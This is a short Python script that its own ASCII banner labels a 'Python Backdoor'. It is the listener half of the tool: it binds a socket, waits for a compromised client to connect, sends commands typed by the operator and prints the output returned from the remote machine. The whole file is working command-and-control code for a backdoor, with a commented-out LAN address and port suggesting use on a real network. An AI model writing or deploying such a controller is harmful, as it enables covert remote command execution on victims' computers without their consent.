import socket

print(" ____        _   _")
print("|  _ \ _   _| |_| |__   ___  _ __")
print("| |_) | | | | __| '_ \ / _ \| '_ \")
print("|  __/| |_| | |_| | | | (_) | | | |")
print("|_|__  \__, |\__|_| |_|\___/|_| |_|")
print("| __ ) |___/  ___| | ____| |")
print("|  _ \ / _` |/ __| |/ / _` |/ _ \ / _ \| '__|")
print("| |_) | (_| | (__|   < (_| | (_) | (_) | |")
print("|____/ \__,_|\___|_|\_\__,_|\___/ \___/|_|   ")

HOST = '127.0.0.1' # '192.168.43.82'
PORT = 8081 # 2222
server = socket.socket()
server.bind((HOST, PORT))
print('[+] Server Started')
print('[+] Listening For Client Connection ...')
server.listen(1)
client, client_addr = server.accept()
print(f'[+] {client_addr} Client connected to the server')

while True:
    command = input('Enter Command : ')
    command = command.encode()
    client.send(command)
    print('[+] Command sent')
    output = client.recv(1024)
    output = output.decode()
    print(f"Output: {output}")